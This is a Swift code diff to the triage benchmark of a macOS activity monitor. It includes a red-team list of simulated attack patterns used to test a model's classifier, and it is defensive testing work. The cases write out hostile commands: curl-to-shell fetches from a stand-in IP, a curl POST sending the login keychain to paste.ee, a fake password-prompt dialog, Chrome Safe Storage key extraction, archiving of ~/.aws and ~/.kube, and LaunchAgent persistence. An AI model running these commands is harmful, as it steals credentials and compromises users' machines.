@@ -12,6 +12,7 @@ struct BenchCase: Sendable {
     var risk: PatternRisk
     var prompt: String
     var label: String
+    var warned = false                   // Hostwatch found a warning sign: the router never takes a local Safe
 }
 
 private struct BenchAnswer: Sendable {
@@ -52,12 +53,10 @@ func runTriageBenchmark() -> Never {
     }
     let picked = Array(safe.prefix(perClass)) + Array(flagged.prefix(perClass))
     let cases = picked.map { e -> BenchCase in
-        let path = SignatureStore.subjectPath(e)
-        let id = SigningCache.shared.cached(path) ?? SigningCache.shared.identity(path)
-        return BenchCase(key: e.id, truth: e.status, risk: e.risk,
-                         prompt: AppleOnDeviceModel.prompt(for: e, signer: id,
-                                                           trusted: id.map { SigningCache.shared.trusts(path, $0) } ?? false),
-                         label: "\(displayProcessName(e.process)) → \(e.pattern)")
+        // No app here, so no recorded launches: the benchmark measures the prompt and the model, not the context.
+        BenchCase(key: e.id, truth: e.status, risk: e.risk, prompt: TriagePrompt.pattern(e, context: nil),
+                  label: "\(displayProcessName(e.process)) → \(e.pattern)",
+                  warned: !TriagePrompt.warningSigns(e, context: nil).isEmpty)
     } + red
     let sources = Dictionary(grouping: saved.entries, by: { "\($0.source ?? "none")/\($0.status.rawValue)" }).mapValues(\.count)
     print("decisions by who and what: " + sources.sorted { $0.key < $1.key }.map { "\($0.key) \($0.value)" }.joined(separator: ", "))
@@ -89,6 +88,7 @@ func runTriageBenchmark() -> Never {
 }
 
 private func score(_ model: String, _ cases: [BenchCase], _ answers: [BenchAnswer]) -> (String, String) {
+    var modelFalseSafe = 0
     var falseSafe = 0, settledSafe = 0, flaggedCaught = 0, safeAgreed = 0, unsure = 0, errors = 0
     var times: [Double] = []
     var lines = ""
@@ -100,7 +100,9 @@ private func score(_ model: String, _ cases: [BenchCase], _ answers: [BenchAnswe
         }
         times.append(a.seconds)
         // What the router would do with it: only a confident Safe on a pattern that isn't high-risk is settled.
-        let settles = v == .safe && a.confidence == .high && c.risk != .high
+        let modelSettles = v == .safe && a.confidence == .high && c.risk != .high
+        let settles = modelSettles && !c.warned
+        if modelSettles, c.truth != .safe { modelFalseSafe += 1 }
         let saysFlag = v == .suspicious || v == .dangerous
         if v == .unknown { unsure += 1 }
         if c.truth == .safe {
@@ -120,7 +122,7 @@ private func score(_ model: String, _ cases: [BenchCase], _ answers: [BenchAnswe
     func pct(_ a: Int, _ b: Int) -> String { b == 0 ? "–" : "\(Int((Double(a) / Double(b) * 100).rounded()))%" }
     let summary = """
     \(model)
-      false Safe (settled one you flagged): \(falseSafe) of \(nFlag)
+      false Safe (settled one you flagged): \(falseSafe) of \(nFlag)   (the model alone: \(modelFalseSafe), warning signs stop the rest)
       your Safe ones it would settle:       \(settledSafe) of \(nSafe) (\(pct(settledSafe, nSafe)))
       agrees Safe:                          \(pct(safeAgreed, nSafe))   flags your flagged ones: \(pct(flaggedCaught, nFlag))
       unsure: \(unsure)   errors or refusals: \(errors)
@@ -189,57 +191,84 @@ struct SeededGenerator: RandomNumberGenerator {
 /// a real pattern; the risk line says "normal" on purpose (the heuristic missed it), which is exactly when the model's
 /// answer matters.
 enum BenchRedTeam {
-    static func make(_ program: String, _ path: String, _ activity: String, _ signer: String, _ target: String) -> BenchCase {
-        BenchCase(key: "red:\(program):\(activity.prefix(30))", truth: .dangerous, risk: .normal, prompt: """
-            Program: \(program) (\(path))
-            Activity: \(activity)
-            Signer of the program it concerns: \(signer)
-            Local risk heuristic: normal
-            Seen 1 times. Example target: \(target)
-            """, label: "[attack] \(program) → \(activity.prefix(90))")
+    /// One attack as a real pattern entry with its context, so it goes through the very prompt builder real patterns do.
+    static func make(_ kind: EventKind, actor: String, target: String, pattern: String? = nil, parent: String = "",
+                     host: String? = nil, trail: String, origin: String, command: String = "") -> BenchCase {
+        let now = Date()
+        let process = kind == .exec ? (parent.isEmpty ? actor : parent) : actor
+        let e = SignatureEntry(id: "red|\(target)", kind: kind, process: process, pattern: pattern ?? target, count: 1,
+                               firstSeen: now.addingTimeInterval(-60), lastSeen: now, status: .unclassified,
+                               exampleName: (actor as NSString).lastPathComponent, examplePid: 4242, exampleProc: actor,
+                               exampleTarget: target, exampleExtra: kind == .file ? (pattern?.hasPrefix("w") == true ? "w" : "r") : "",
+                               exampleParent: parent, exampleHost: host, exampleHostSource: host == nil ? nil : "dns")
+        let context = TriageContext(trail: trail, origin: origin, session: nil, command: command)
+        return BenchCase(key: e.id, truth: .dangerous, risk: .normal, prompt: TriagePrompt.pattern(e, context: context),
+                         label: "[attack] \((process as NSString).lastPathComponent) → \(String((pattern ?? target).prefix(90)))",
+                         warned: !TriagePrompt.warningSigns(e, context: context).isEmpty)
     }
 
+    static let home = AppPaths.userHome
     static let cases: [BenchCase] = [
-        make("python3.12", "~/Library/Application Support/.cache/python3.12", "opened files: r ~/.ssh/*  [SSH keys]",
-             "Unsigned, not trusted", "~/.ssh/id_ed25519"),
-        make("Microsoft Word", "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
-             "started the program /usr/bin/osascript -e <display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer>",
-             "Microsoft Corporation, trusted", "/usr/bin/osascript"),
-        make("node", "~/Downloads/installer/node", "started the program /bin/sh -c <curl -fsSL http://#.#.#.#/x.sh | sh>",
-             "Ad-hoc, not trusted", "/bin/sh"),
-        make("zoom.us", "/Applications/zoom.us.app/Contents/MacOS/zoom.us",
-             "started the program /usr/bin/curl -s -X POST --data-binary @~/Library/Keychains/login.keychain-db https://paste.ee/api",
-             "Zoom Communications, trusted", "/usr/bin/curl"),
-        make("sh", "/bin/sh", "started the program /usr/bin/xattr -d com.apple.quarantine ~/Downloads/Free_PDF_Converter.app",
-             "Apple, trusted", "/usr/bin/xattr"),
-        make("GoogleChromeHelper", "/private/tmp/GoogleChromeHelper",
-             "opened files: r ~/Library/Application Support/Google/**/Login Data  [browser credentials]", "Ad-hoc, not trusted",
-             "~/Library/Application Support/Google/Chrome/Default/Login Data"),
-        make("Updater", "~/Library/Application Support/com.apple.updater/Updater", "connected to TCP #.#.#.#:4444",
-             "Unsigned, not trusted", "185.#.#.#:4444"),
-        make("bash", "/bin/bash", "opened files: w ~/Library/LaunchAgents/com.apple.softwareupdated.plist  [persistence]",
-             "Apple, trusted", "~/Library/LaunchAgents/com.apple.softwareupdated.plist"),
-        make("agent", "/Users/Shared/.svc/agent", "started the program /bin/launchctl load ~/Library/LaunchAgents/com.svc.plist",
-             "Unsigned, not trusted", "/bin/launchctl"),
-        make("osascript", "/usr/bin/osascript", "started the program /usr/bin/sqlite3 ~/Library/Messages/chat.db <select text from message>",
-             "Apple, trusted", "/usr/bin/sqlite3"),
-        make("python3", "/usr/local/bin/python3", "started the program /usr/bin/security find-generic-password -wa <Chrome Safe Storage>",
-             "Unsigned, not trusted", "/usr/bin/security"),
-        make("helper", "/private/tmp/.x/helper", "started the program /usr/sbin/screencapture -x /tmp/.s.png",
-             "Ad-hoc, not trusted", "/usr/sbin/screencapture"),
-        make("sh", "/bin/sh", "started the program /bin/sh -c <echo <base64> | base64 -d | sh>", "Apple, trusted", "/bin/sh"),
-        make("ncat", "~/Downloads/ncat", "connected to TCP #.#.#.#:9001", "Ad-hoc, not trusted", "45.#.#.#:9001"),
-        make("python3", "/usr/local/bin/python3", "started the program /usr/bin/zip -qr /tmp/.d.zip ~/Documents ~/.aws ~/.kube",
-             "Unsigned, not trusted", "/usr/bin/zip"),
-        make(".helper", "~/Library/.helper", "opened files: r ~/Library/Cookies/*  [cookies]", "Unsigned, not trusted",
-             "~/Library/Cookies/Cookies.binarycookies"),
-        make("sync", "/private/var/tmp/sync", "started the program /usr/bin/crontab /private/var/tmp/.c", "Unsigned, not trusted",
-             "/usr/bin/crontab"),
-        make("tccfix", "~/Downloads/tccfix", "opened files: w ~/Library/Application Support/com.apple.TCC/TCC.db  [TCC database]",
-             "Ad-hoc, not trusted", "~/Library/Application Support/com.apple.TCC/TCC.db"),
-        make("PDFReader", "/Applications/PDFReader.app/Contents/MacOS/PDFReader",
-             "started the program /bin/zsh -c <curl -s https://#.#.#.#/p | python3 ->", "Unsigned, not trusted", "/bin/zsh"),
-        make("Discord Helper", "/Applications/Discord.app/Contents/Frameworks/Discord Helper.app/Contents/MacOS/Discord Helper",
-             "opened files: r ~/.aws/*  [cloud credentials]", "Discord, Inc., trusted", "~/.aws/credentials"),
+        make(.file, actor: home + "/Library/Application Support/.cache/python3.12", target: home + "/.ssh/id_ed25519",
+             pattern: "r ~/.ssh/*  [SSH keys]", trail: "launchd › python3.12", origin: "Started by macOS itself, as a system or login service"),
+        make(.exec, actor: "/usr/bin/osascript", target: "/usr/bin/osascript",
+             pattern: "/usr/bin/osascript -e <display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer>",
+             parent: "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word", trail: "Microsoft Word › osascript",
+             origin: "Started by the app Microsoft Word",
+             command: "osascript -e 'display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer'"),
+        make(.exec, actor: "/bin/sh", target: "/bin/sh", pattern: "/bin/sh -c <curl -fsSL http://#.#.#.#/x.sh | sh>",
+             parent: home + "/Downloads/installer/node", trail: "Finder › node › sh", origin: "Started by the app Finder",
+             command: "sh -c 'curl -fsSL http://45.9.1.2/x.sh | sh'"),
+        make(.exec, actor: "/usr/bin/curl", target: "/usr/bin/curl",
+             pattern: "/usr/bin/curl -s -X POST --data-binary @~/Library/Keychains/login.keychain-db https://paste.ee/api",
+             parent: "/Applications/zoom.us.app/Contents/MacOS/zoom.us", trail: "zoom.us › curl", origin: "Started by the app zoom.us",
+             command: "curl -s -X POST --data-binary @" + home + "/Library/Keychains/login.keychain-db https://paste.ee/api"),
+        make(.exec, actor: "/usr/bin/xattr", target: "/usr/bin/xattr",
+             pattern: "/usr/bin/xattr -d com.apple.quarantine ~/Downloads/Free_PDF_Converter.app", parent: "/bin/sh",
+             trail: "Installer › sh › xattr", origin: "Started by the app Installer",
+             command: "xattr -d com.apple.quarantine " + home + "/Downloads/Free_PDF_Converter.app"),
+        make(.file, actor: "/private/tmp/GoogleChromeHelper", target: home + "/Library/Application Support/Google/Chrome/Default/Login Data",
+             pattern: "r ~/Library/Application Support/Google/**/Login Data  [browser credentials]",
+             trail: "launchd › GoogleChromeHelper", origin: "Started by macOS itself, as a system or login service"),
+        make(.net, actor: home + "/Library/Application Support/com.apple.updater/Updater", target: "185.220.101.4:4444",
+             pattern: "TCP #.#.#.#:4444", trail: "launchd › Updater", origin: "Started by macOS itself, as a system or login service"),
+        make(.file, actor: "/bin/bash", target: home + "/Library/LaunchAgents/com.apple.softwareupdated.plist",
+             pattern: "w ~/Library/LaunchAgents/com.apple.softwareupdated.plist  [persistence]",
+             trail: "Safari › bash", origin: "Started by the app Safari"),
+        make(.exec, actor: "/bin/launchctl", target: "/bin/launchctl", pattern: "/bin/launchctl load ~/Library/LaunchAgents/com.svc.plist",
+             parent: "/Users/Shared/.svc/agent", trail: "launchd › agent › launchctl", origin: "Started by macOS itself, as a system or login service",
+             command: "launchctl load " + home + "/Library/LaunchAgents/com.svc.plist"),
+        make(.exec, actor: "/usr/bin/sqlite3", target: "/usr/bin/sqlite3",
+             pattern: "/usr/bin/sqlite3 ~/Library/Messages/chat.db <select text from message>", parent: "/usr/bin/osascript",
+             trail: "Pages › osascript › sqlite3", origin: "Started by the app Pages",
+             command: "sqlite3 " + home + "/Library/Messages/chat.db 'select text from message'"),
+        make(.exec, actor: "/usr/bin/security", target: "/usr/bin/security",
+             pattern: "/usr/bin/security find-generic-password -wa <Chrome Safe Storage>", parent: "/usr/local/bin/python3",
+             trail: "launchd › python3 › security", origin: "Started by macOS itself, as a system or login service",
+             command: "security find-generic-password -wa 'Chrome Safe Storage'"),
+        make(.exec, actor: "/usr/sbin/screencapture", target: "/usr/sbin/screencapture", pattern: "/usr/sbin/screencapture -x /tmp/.s.png",
+             parent: "/private/tmp/.x/helper", trail: "launchd › helper › screencapture", origin: "Started by macOS itself, as a system or login service",
+             command: "screencapture -x /tmp/.s.png"),
+        make(.exec, actor: "/bin/sh", target: "/bin/sh", pattern: "/bin/sh -c <echo <base64> | base64 -d | sh>", parent: "/bin/sh",
+             trail: "Slack › sh › sh", origin: "Started by the app Slack", command: "sh -c 'echo ZWNobyBoaQ== | base64 -d | sh'"),
+        make(.net, actor: home + "/Downloads/ncat", target: "45.9.1.2:9001", pattern: "TCP #.#.#.#:9001",
+             trail: "Terminal › zsh › ncat", origin: "Started from Terminal, a terminal"),
+        make(.exec, actor: "/usr/bin/zip", target: "/usr/bin/zip", pattern: "/usr/bin/zip -qr /tmp/.d.zip ~/Documents ~/.aws ~/.kube",
+             parent: "/usr/local/bin/python3", trail: "launchd › python3 › zip", origin: "Started by macOS itself, as a system or login service",
+             command: "zip -qr /tmp/.d.zip " + home + "/Documents " + home + "/.aws " + home + "/.kube"),
+        make(.file, actor: home + "/Library/.helper", target: home + "/Library/Cookies/Cookies.binarycookies",
+             pattern: "r ~/Library/Cookies/*  [cookies]", trail: "launchd › .helper", origin: "Started by macOS itself, as a system or login service"),
+        make(.exec, actor: "/usr/bin/crontab", target: "/usr/bin/crontab", pattern: "/usr/bin/crontab /private/var/tmp/.c",
+             parent: "/private/var/tmp/sync", trail: "launchd › sync › crontab", origin: "Started by macOS itself, as a system or login service",
+             command: "crontab /private/var/tmp/.c"),
+        make(.file, actor: home + "/Downloads/tccfix", target: home + "/Library/Application Support/com.apple.TCC/TCC.db",
+             pattern: "w ~/Library/Application Support/com.apple.TCC/TCC.db  [TCC database]", trail: "Finder › tccfix",
+             origin: "Started by the app Finder"),
+        make(.exec, actor: "/bin/zsh", target: "/bin/zsh", pattern: "/bin/zsh -c <curl -s https://#.#.#.#/p | python3 ->",
+             parent: "/Applications/PDFReader.app/Contents/MacOS/PDFReader", trail: "PDFReader › zsh", origin: "Started by the app PDFReader",
+             command: "zsh -c 'curl -s https://45.9.1.2/p | python3 -'"),
+        make(.file, actor: "/Applications/Discord.app/Contents/Frameworks/Discord Helper.app/Contents/MacOS/Discord Helper",
+             target: home + "/.aws/credentials", pattern: "r ~/.aws/*  [cloud credentials]", trail: "Discord › Discord Helper",
+             origin: "Started by the app Discord"),
     ]
 }
